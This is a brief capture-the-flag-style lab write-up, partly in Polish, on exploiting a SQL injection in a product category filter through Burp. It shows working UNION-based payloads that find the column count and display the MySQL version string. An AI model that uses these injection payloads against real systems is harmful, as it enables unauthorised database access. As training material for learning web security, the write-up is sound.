Title: SQL injection attack, querying the database type and version on MySQL and Microsoft
Level: Practitioner
Desc:  This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
To solve the lab, display the database version string. 

W przeglądarce nie działało, w Burp już tak
`category=Gifts' OR 1=1#`
![image](https://github.com/user-attachments/assets/32cc23eb-4df5-448f-a191-107ab3931b27)

`category=Gifts' OR 1=1 UNION SELECT NULL,NULL#`
![image](https://github.com/user-attachments/assets/6f1fcc36-65d7-4498-b9ca-54057a21606d)

`category=Gifts' OR 1=1 UNION SELECT '1',version()#`
![image](https://github.com/user-attachments/assets/e40c57a9-4847-4b9c-af6d-24496f1dcefd)
